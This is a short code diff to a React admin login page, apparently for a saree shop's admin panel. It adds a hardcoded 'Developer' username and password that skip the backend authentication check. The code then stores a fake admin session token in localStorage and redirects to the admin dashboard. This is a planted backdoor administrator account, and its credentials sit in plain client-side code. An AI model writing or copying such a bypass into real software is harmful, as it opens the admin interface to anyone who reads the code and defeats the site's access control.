@@ -25,6 +25,21 @@ const AdminLogin = () => {
         setLoading(true);
         setError('');
 
+        // Hardcoded Developer Admin access (bypasses database / backend check)
+        if (credentials.username === 'Developer' && credentials.password === 'Developer@1234') {
+            localStorage.setItem('adminAuth', JSON.stringify({
+                isAuthenticated: true,
+                username: 'Developer',
+                role: 'admin',
+                isDeveloper: true,
+                token: 'developer-bypass-token',
+                loginTime: new Date().toISOString()
+            }));
+            setLoading(false);
+            navigate('/_gurusareesadmin_@_/dashboard');
+            return;
+        }
+
         try {
             const response = await adminAuthAPI.login(credentials);
             if (response.token) {
